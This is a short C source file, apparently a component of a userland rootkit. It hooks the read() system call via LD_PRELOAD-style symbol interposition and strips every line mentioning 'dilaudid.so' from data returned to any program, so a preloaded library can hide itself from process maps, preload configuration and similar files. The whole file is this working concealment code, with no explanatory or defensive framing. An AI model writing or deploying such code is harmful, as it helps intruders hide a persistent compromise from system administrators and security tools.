#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *match;

        // Perform the search relative to the current position inside the buffer
        while ((match = memmem(start, result, "dilaudid.so", 11)) != NULL) {
            char *buf_start = (char *)buf;
            char *end = buf_start + result;

            // Safe calculation for memrchr: search backward from match to the start of the buffer
            char *line_start = NULL;
            if (match > buf_start) {
                line_start = memrchr(buf_start, '\n', match - buf_start);
            }
            // Ensure line_start is either the character after the newline or the absolute beginning
            line_start = line_start ? line_start + 1 : buf_start;

            char *line_end = memchr(match, '\n', end - match);
            line_end = line_end ? line_end + 1 : end;

            size_t line_len = line_end - line_start;

            if (line_len > 0) {
                // Shift remaining data forward to overwrite the line
                memmove(line_start, line_end, end - line_end);
                result -= line_len;

                // Reset the search anchor to the beginning of the modified buffer
                start = buf_start;
            } else {
                // Safeguard against 0-byte modifications to prevent infinite loops
                break;
            }
        }
    }
    return result;
}

